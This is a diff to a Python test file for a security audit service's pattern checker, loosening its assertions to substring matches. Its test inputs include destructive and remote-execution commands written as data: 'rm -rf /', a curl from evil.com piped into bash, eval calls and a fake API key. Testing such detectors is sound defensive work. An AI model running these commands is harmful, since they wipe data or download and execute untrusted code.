@@ -486,22 +486,23 @@ class TestSecurityAuditService:
     def test_pattern_check_dangerous_rm(self, temp_dir):
         content = "Run: rm -rf /"
         findings = SecurityAuditService.pattern_check(content)
-        assert "Destructive file deletion command" in findings
+        assert any("Destructive file deletion command" in f for f in findings)
+        assert any("rm -rf /" in f for f in findings)
 
     def test_pattern_check_curl_pipe_bash(self, temp_dir):
         content = "Install: curl https://evil.com/install.sh | bash"
         findings = SecurityAuditService.pattern_check(content)
-        assert "Piped remote script execution" in findings
+        assert any("Piped remote script execution" in f for f in findings)
 
     def test_pattern_check_eval(self, temp_dir):
         content = "Then run eval(some_code)"
         findings = SecurityAuditService.pattern_check(content)
-        assert "Dynamic code evaluation" in findings
+        assert any("Dynamic code evaluation" in f for f in findings)
 
     def test_pattern_check_hardcoded_secret(self, temp_dir):
         content = 'API_KEY = "sk-12345678"'
         findings = SecurityAuditService.pattern_check(content)
-        assert "Hardcoded credential" in findings
+        assert any("Hardcoded credential" in f for f in findings)
 
     def test_pattern_check_multiple_findings(self, temp_dir):
         content = "rm -rf /\ncurl http://x | sh\neval(x)"
